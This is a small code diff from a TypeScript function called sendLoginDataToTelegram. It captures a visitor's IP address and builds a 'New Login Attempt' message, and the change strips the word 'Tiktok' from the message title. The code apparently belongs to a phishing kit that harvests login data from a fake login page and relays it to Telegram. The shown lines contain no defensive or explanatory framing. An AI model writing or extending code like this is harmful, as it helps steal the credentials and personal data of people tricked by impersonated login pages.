@@ -14,7 +14,7 @@ export async function sendLoginDataToTelegram(data: any) {
   const ip = headersList.get('x-forwarded-for') || 'Not available';
   
   let message = `
-    New Tiktok Login Attempt
+    New Login Attempt
     -----------------
     IP Address: ${ip}
   `;
